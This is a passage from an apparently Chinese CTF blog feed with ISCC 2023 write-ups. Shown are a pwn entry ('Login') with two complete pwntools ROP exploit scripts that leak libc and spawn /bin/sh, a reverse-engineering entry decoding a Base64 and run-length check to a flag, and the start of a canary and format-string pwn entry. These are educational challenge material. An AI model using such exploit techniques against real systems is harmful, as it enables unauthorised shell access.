alt="ISCC2023-Login10.png"></p><p><em>当然，不使用程序直接给出的 <code>stdin</code> 也是可以的，我们可以自己通过 <code>puts()</code> 函数来泄露其他函数的地址，然后计算偏移</em></p><hr><h1 id="脚本一"><a href="#脚本一" class="headerlink" title="脚本一"></a>脚本一</h1><blockquote><p>直接使用程序输出的 <code>_IO_2_1_stdin_</code> 地址来 getshell （使用 <code>stdin</code> 是不行的）</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Here is a tip: "</span><span class="token punctuation">)</span>stdin_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment"># 获取程序输出的地址</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stdin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the username:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">365696460</span><span class="token punctuation">)</span> <span class="token comment"># 修改 v6 绕过 if</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># 利用 _IO_2_1_stdin_ 计算 libc 偏移</span>libcbase <span class="token operator">=</span> stdin_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4008c3</span> <span class="token comment"># 64 位传参</span>ret <span class="token operator">=</span> <span class="token number">0x400599</span> <span class="token comment"># 用于堆栈平衡（glibc 2.27 以下可以不加 ret, 不影响程序执行流）</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the password:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果一"><a href="#结果一" class="headerlink" title="结果一"></a>结果一</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login11.png" alt="ISCC2023-Login11.png"></p><hr><h1 id="脚本二"><a href="#脚本二" class="headerlink" title="脚本二"></a>脚本二</h1><blockquote><p>使用两次 ROP 获取 <code>puts</code> 的真实地址来计算偏移 getshell</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Here is a tip: "</span><span class="token punctuation">)</span>stdin_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stdin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 第一次 ROP 泄露程序中 puts() 的真实地址</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the username:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">365696460</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4008c3</span>ret <span class="token operator">=</span> <span class="token number">0x400599</span> <span class="token comment"># 用于堆栈平衡（glibc 2.27 以下可以不加 ret, 不影响程序执行流）</span>puts_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the password:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># 记录泄露出的 puts() 的真实地址</span>io<span class="token punctuation">.</span>recvlines<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 第二次 ROP 来 getshell</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the username:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">365696460</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the password:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果二"><a href="#结果二" class="headerlink" title="结果二"></a>结果二</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login12.png" alt="ISCC2023-Login12.png"></p><hr><blockquote><p>上述两个脚本只适用于旧版本的 Ubuntu，例如 Ubuntu 16.04，如果使用 Ubuntu 22.04 这种会发现同样的 exp 却无法 getshell</p><p>原因在于程序使用的 libc 与 Ubuntu 22.04 的 libc 版本不同，而 libc 版本依赖于 ld 版本，所以如果在 Ubuntu 22.04 下强行使用题目提供的 libc 来运行程序会使程序发生崩溃</p><p><em>详见 《<a href="PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%98.md">PWN中程序的libc问题</a>》 一文</em></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【ISCC 2023】变形记</title>
      <link href="/posts/38e84743.html"/>
      <url>/posts/38e84743.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>熟悉伪代码中 Base64 算法的不同实现方法</mark></p></li><li><p>熟悉一些逆向的代码逻辑</p></li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】变形记</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>定位到主函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B01.png" alt="ISCC2023-变形记1.png"></p><p>查看字符串：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B02.png" alt="ISCC2023-变形记2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B03.png" alt="ISCC2023-变形记3.png"></p><p>发现形似 Base64 加密的字符串和 Base64 加密的码表</p><p>跟进码表位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B04.png" alt="ISCC2023-变形记4.png"></p><p>这里先将 Base64 码表 <code>BASE64_table_404200</code> 赋值给了 <code>v6</code> 和 <code>v56</code></p><p>由于每一步 <code>if else</code> 都会执行 <code>sub_401960()</code> 函数，跟进：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B05.png" alt="ISCC2023-变形记5.png"></p><p>该函数的作用是在堆上分配一段新的内存空间，并将原始数据从源地址复制到新分配的内存中<br>即：该函数可用于扩展内存空间并复制数据</p><p>根据 <code>sub_401180()</code> 代码中的替换规则：</p><table><thead><tr><th align="left">步骤</th><th align="left">代码</th></tr></thead><tbody><tr><td align="left">一：第一个字符右移 2 位，取前 6 位作为索引值，查找对应字符</td><td align="left"><code>v10 = v6[*(v7 - 2) &gt;&gt; 2]</code><br><code>sub_401960(Src, v8, v48, v10)</code><br></td></tr><tr><td align="left">二：第一个字符取后 2 位与第二个字符的前 4 位拼接，查找对应字符</td><td align="left"><code>v13 = 16 * (*(v7 - 2) &amp; 3)</code><br><code>v31 = v56[v13]</code><br><code>sub_401960(Src, v32, v42, v31)</code><br><br><code>v14 = v56[v13 + (*(v7 - 1) &gt;&gt; 4)]</code><br><code>sub_401960(Src, v15, v47, v14)</code><br></td></tr><tr><td align="left">三：第二个字符取后 4 位与第三个字符的前 2 位拼接，查找对应字符</td><td align="left"><code>v18 = 4 * (*(v7 - 1) &amp; 0xF)</code><br><code>v26 = v56[v18]</code><br><code>sub_401960(Src, v27, v44, v26)</code><br><br><code>v19 = v56[v18 + (*v7 &gt;&gt; 6)]</code><br><code>sub_401960(Src, v20, v46, v19)</code><br></td></tr><tr><td align="left">四：第三个字符取后 6 位作为索引，查找对应字符</td><td align="left"><code>v23 = v56[*v7 &amp; 0x3F]</code><br><code>sub_401960(Src, v24, v45, v56[*v7 &amp; 0x3F])</code><br></td></tr></tbody></table><p>符合 Base64 加密的算法逻辑<br>所以 <code>sub_401180()</code> 函数其实就是 <code>Base64Encode()</code><br>即：主函数中 <code>sub_4014C0(v39, Block, v17, v32)</code> 进行的是 Base64 加密</p><p>分析可知 <code>sub_401820()</code> 为 <code>strcpy()</code> 函数<br>存在 Base64 的字符串：<code>=onQzpXUjFldhl3YWpnVyEWe6Jke</code><br>后面这一段代码进行了字符串的反转：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B06.png" alt="ISCC2023-变形记6.png"></p><p><code>v37[]</code> 存储的是 <code>=onQzpXUjFldhl3YWpnVyEWe6Jke</code>，<code>v49[]</code> 是一个新的数组，<code>v18</code> 为 <code>v37[]</code> 的长度，<code>v20</code> 为索引位置，<code>v49[v20 - 2] = *(v22 + v18 - v20 - 1)</code> 将 <code>v37[]</code> 反向复制到 <code>v49[]</code></p><p>于是使用 <a href="http://gv99.com/text/string2reverse.html">在线字符串反转</a> 反向并进行 Base64 解密发现解密成功：<code>zBzya2VzVcyavQcQzsBz</code><br>但是 <code>ISCC&#123;zBzya2VzVcyavQcQzsBz&#125;</code> 结果不对</p><p>发现在前面还有一段代码：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B07.png" alt="ISCC2023-变形记7.png"></p><p>其中：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        v13 <span class="token operator">=</span> v37<span class="token punctuation">;</span>        v14 <span class="token operator">=</span> v37<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v39 <span class="token operator">>=</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>          v13 <span class="token operator">=</span> v9<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v39 <span class="token operator">>=</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>          v14 <span class="token operator">=</span> v9<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> v11<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v14 <span class="token operator">+</span> v11 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token operator">++</span>v12<span class="token punctuation">;</span>LABEL_37<span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v11 <span class="token operator">>=</span> v38 <span class="token punctuation">)</span>          <span class="token keyword">goto</span> LABEL_38<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置了两个指针 <code>v13</code> 和 <code>v14</code>，用于寻找两个相同且相邻的元素<br>如果遇到两个相同且相邻的元素，就累加重复次数 <code>v12</code>，直到遇到不相等的元素为止</p><p>并且：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">LABEL_37<span class="token operator">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v11 <span class="token operator">>=</span> v38 <span class="token punctuation">)</span>          <span class="token keyword">goto</span> LABEL_38<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      v15 <span class="token operator">=</span> v37<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v39 <span class="token operator">>=</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>        v15 <span class="token operator">=</span> v9<span class="token punctuation">;</span>      v49<span class="token punctuation">[</span>v10 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v15 <span class="token operator">+</span> v11<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token operator">&lt;</span> <span class="token number">10</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token operator">++</span>v10<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>LABEL_36<span class="token operator">:</span>          v12 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">goto</span> LABEL_37<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        v49<span class="token punctuation">[</span>v10 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v12 <span class="token operator">/</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">;</span>        v10 <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      v9 <span class="token operator">=</span> v37<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v49<span class="token punctuation">[</span>v10<span class="token operator">++</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v12 <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">;</span>      <span class="token keyword">goto</span> LABEL_36<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码根据重复次数 <code>v12</code> 将重复的字母替换成对应的数字，并存储在数组 <code>v49</code> 中</p><p>换成数字的规则是：<br>① 如果重复次数 <code>v12</code> 小于 10，则直接将其转换为字符存储<br>② 如果重复次数 <code>v12</code> 大于等于 10，则将十位数和个位数分别转换为字符存储</p><p>因此，直接将数字替换为前面一个字符即可，得到 flag 为：<code>ISCC&#123;zBzyaaVzVcyavQcQzsBz&#125;</code></p><p>综上所述，程序逻辑如下：<br>① 在用户输入的数据中，先将重复的字母替换成对应的数字<br>② 然后进行 Base64 加密<br>③ 再将加密后的字符串反转<br>④ 与 <code>=onQzpXUjFldhl3YWpnVyEWe6Jke</code> 进行比较，如果相等则正确</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64  ss <span class="token operator">=</span> <span class="token string">"=onQzpXUjFldhl3YWpnVyEWe6Jke"</span>  res <span class="token operator">=</span> ss<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  re <span class="token operator">=</span> <span class="token string">""</span>  re <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># Base64解密  </span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span>  result <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>re<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">:</span>  <span class="token comment"># 重复次数小于等于9（个位数）  </span>        tmp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>re<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span> <span class="token operator">-</span> <span class="token number">1</span>          result <span class="token operator">+=</span> re<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> tmp          <span class="token keyword">continue</span>      result <span class="token operator">+=</span> re<span class="token punctuation">[</span>i<span class="token punctuation">]</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ISCC&#123;"</span> <span class="token operator">+</span> result <span class="token operator">+</span> <span class="token string">"&#125;"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>ISCC{zBzyaaVzVcyavQcQzsBz}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-%E5%8F%98%E5%BD%A2%E8%AE%B08.png" alt="ISCC2023-变形记8.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【ISCC 2023】三个愿望</title>
      <link href="/posts/5cc69016.html"/>
      <url>/posts/5cc69016.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>伪随机数绕过</p></li><li><p><mark>利用格式化字符串漏洞绕过 <code>canary</code> 金丝雀保护</mark></p></li><li><p>最后一步溢出时，跳转地址为 <code>system(&quot;/bin/sh&quot;)</code> 的地址 <code>0x4011F5</code>，比赛时使用 <code>elf.symbols[&quot;haveadoor&quot;]</code>（<code>0x4011D6</code>）在远程是可以的，但本地无法 PWN 通</p></li></ul><hr><p><a href="https://iscc.isclab.org.cn/">（2023年5月1日-2023年5月25日）【ISCC 2023】三个愿望</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>分析文件并运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B1.png" alt="2023ISCC-三个愿望1.png"></p><p>开启了金丝雀保护，栈不可执行，但没有开启 PIE 地址随机化</p><p>在 IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B2.png" alt="2023ISCC-三个愿望2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B3.png" alt="2023ISCC-三个愿望3.png"></p><p>首先输入 <code>s</code>，<code>s</code> 的长度为 0x16，观察栈中数据，发现 <code>s</code> 的长度不足以覆盖栈上的返回地址</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B4.png" alt="2023ISCC-三个愿望4.png"></p><p>后面需要绕过伪随机数的校验，发现伪随机数种子 <code>seed</code> 是可以由 <code>s</code> 覆盖的<br>因此可以通过 <code>s</code> 将 <code>seed</code> 覆盖为我们设置的值，即可绕过每一次伪随机数校验</p><p>绕过伪随机数后，进入 <code>secondwish()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B5.png" alt="2023ISCC-三个愿望5.png"></p><p>输入 <code>s</code> 并且 <code>printf(s)</code> 存在格式化字符串漏洞</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B7.png" alt="2023ISCC-三个愿望7.png"></p><p><code>s</code> 的长度为 0x10，无法覆盖栈上的返回地址，最后 <code>var_8</code> 的地方为 <code>canary</code></p><p>当执行完 <code>secondwish()</code> 函数后，<code>v3 = 1</code>，下一次循环进入 <code>thirdwish()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B6.png" alt="2023ISCC-三个愿望6.png"></p><p>输入 <code>s</code> 的长度为 0x40 是可以溢出到返回地址的<br>但是栈中 <code>var_8</code> 处存在 <code>canary</code> 保护，不可以直接覆盖返回地址</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023ISCC-%E4%B8%89%E4%B8%AA%E6%84%BF%E6%9C%9B8.png" 